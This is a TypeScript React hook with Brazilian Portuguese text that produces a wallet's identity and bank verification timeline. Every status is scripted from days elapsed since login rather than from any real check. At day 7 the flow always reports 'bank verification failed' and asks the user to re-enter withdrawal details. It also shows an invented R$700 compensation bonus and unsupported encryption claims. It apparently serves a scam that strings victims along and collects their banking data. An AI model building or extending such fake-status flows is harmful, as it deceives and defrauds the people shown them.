import { useMemo } from "react";

export type DocStatus = "under_review" | "approved";
export type CashoutStatus = "processing" | "completed" | "failed";
export type ReviewStage = "doc_received" | "doc_reviewing" | "doc_approved" | "bank_verifying" | "bank_failed" | "bank_completed";

export interface TimelineStep {
  id: ReviewStage;
  label: string;
  description: string;
}

export interface ActivityEvent {
  id: string;
  label: string;
  description: string;
  icon: "shield" | "check" | "alert" | "clock" | "bank" | "refresh" | "gift";
  timestamp: string;
}

interface WalletStatus {
  docStatus: DocStatus;
  docLabel: string;
  docColor: "warning" | "success";
  cashoutStatus: CashoutStatus;
  cashoutLabel: string;
  cashoutColor: "warning" | "destructive";
  daysSinceLogin: number;
  currentStage: ReviewStage;
  timeline: TimelineStep[];
  activities: ActivityEvent[];
  needsReverification: boolean;
  estimatedCompletion: string;
  hasBonus: boolean;
}

const TIMELINE_STEPS: TimelineStep[] = [
  { id: "doc_received", label: "Documentos Recebidos", description: "Seus documentos foram enviados e criptografados" },
  { id: "doc_reviewing", label: "Revisão de Identidade", description: "Nossa equipe está verificando seus documentos de identidade" },
  { id: "doc_approved", label: "Identidade Aprovada", description: "Sua identidade foi verificada com sucesso" },
  { id: "bank_verifying", label: "Verificação Bancária", description: "Verificando seu método de saque com nosso processador de pagamentos" },
  { id: "bank_failed", label: "Falha na Verificação Bancária", description: "Não conseguimos verificar seus dados bancários. Por favor, reinsira-os." },
  { id: "bank_completed", label: "Fundos Prontos", description: "Sua conta está totalmente verificada e os fundos estão prontos para saque" },
];

export function useWalletStatus(refreshKey?: number): WalletStatus {
  return useMemo(() => {
    const ts = localStorage.getItem("wallet_login_ts");
    const daysSinceLogin = ts
      ? Math.floor((Date.now() - Number(ts)) / (1000 * 60 * 60 * 24))
      : 0;

    const params = new URLSearchParams(window.location.search);
    const overrideDays = params.get("days");
    const days = overrideDays !== null ? Number(overrideDays) : daysSinceLogin;

    const docApproved = days >= 3;
    const cashoutFailed = days >= 7;
    const cashoutCompleted = days >= 5 && days < 7;

    const hasBonus = localStorage.getItem("reverification_bonus") === "true";

    // Determine current stage in timeline
    let currentStage: ReviewStage;
    if (days < 1) currentStage = "doc_received";
    else if (days < 3) currentStage = "doc_reviewing";
    else if (days < 5) currentStage = "bank_verifying";
    else if (cashoutFailed) currentStage = "bank_failed";
    else if (cashoutCompleted) currentStage = "bank_completed";
    else currentStage = "doc_approved";

    // Build activity feed based on days elapsed
    const activities: ActivityEvent[] = [];

    activities.push({
      id: "evt_encrypt",
      label: "Documentos criptografados e armazenados",
      description: "Seus 3 documentos foram protegidos com criptografia de ponta a ponta",
      icon: "shield",
      timestamp: "Dia 0",
    });

    if (days >= 1) {
      activities.push({
        id: "evt_review_start",
        label: "Revisão de identidade iniciada",
        description: "Sistema de verificação automatizada começou a processar seus documentos",
        icon: "clock",
        timestamp: "Dia 1",
      });
    }

    if (days >= 3) {
      activities.push({
        id: "evt_doc_approved",
        label: "Identidade verificada",
        description: "Seus documentos de identidade passaram nas verificações",
        icon: "check",
        timestamp: "Dia 3",
      });
    }

    if (days >= 4) {
      activities.push({
        id: "evt_bank_start",
        label: "Verificação bancária iniciada",
        description: "Nosso processador de pagamentos começou a verificar seu método de saque",
        icon: "bank",
        timestamp: "Dia 4",
      });
    }

    if (cashoutFailed) {
      activities.push({
        id: "evt_bank_failed",
        label: "Falha na verificação bancária",
        description: "Seus dados bancários não puderam ser verificados. Por favor, reinsira suas informações de saque.",
        icon: "alert",
        timestamp: "Dia 7",
      });
    } else if (cashoutCompleted) {
      activities.push({
        id: "evt_bank_done",
        label: "Verificação bancária concluída",
        description: "Seu método de saque está verificado e pronto",
        icon: "check",
        timestamp: "Dia 5",
      });
    }

    if (hasBonus) {
      activities.unshift({
        id: "evt_bonus",
        label: "Bônus de compensação creditado",
        description: "Bônus de R$ 700,00 adicionado ao seu saldo pelo atraso na verificação",
        icon: "gift",
        timestamp: "Hoje",
      });
    }

    // Estimate completion
    let estimatedCompletion: string;
    if (cashoutFailed) {
      estimatedCompletion = "Aguardando re-verificação";
    } else if (cashoutCompleted) {
      estimatedCompletion = "Concluído";
    } else if (days >= 3) {
      const remaining = Math.max(1, 7 - days);
      estimatedCompletion = `~${remaining} dia${remaining > 1 ? "s" : ""} restante${remaining > 1 ? "s" : ""}`;
    } else {
      estimatedCompletion = "~5-7 dias restantes";
    }

    return {
      daysSinceLogin: days,
      docStatus: docApproved ? "approved" : "under_review",
      docLabel: docApproved ? "Documentos Aprovados" : "Documentos em Revisão",
      docColor: docApproved ? "success" : "warning",
      cashoutStatus: cashoutFailed ? "failed" : cashoutCompleted ? "completed" : "processing",
      cashoutLabel: cashoutFailed
        ? "Falhou - Verificação bancária necessária"
        : cashoutCompleted
        ? "Verificado e Pronto"
        : "Processando (3-5 dias úteis)",
      cashoutColor: cashoutFailed ? "destructive" : "warning",
      currentStage,
      timeline: TIMELINE_STEPS,
      activities,
      needsReverification: cashoutFailed,
      estimatedCompletion,
      hasBonus,
    };
  }, [refreshKey]);
}
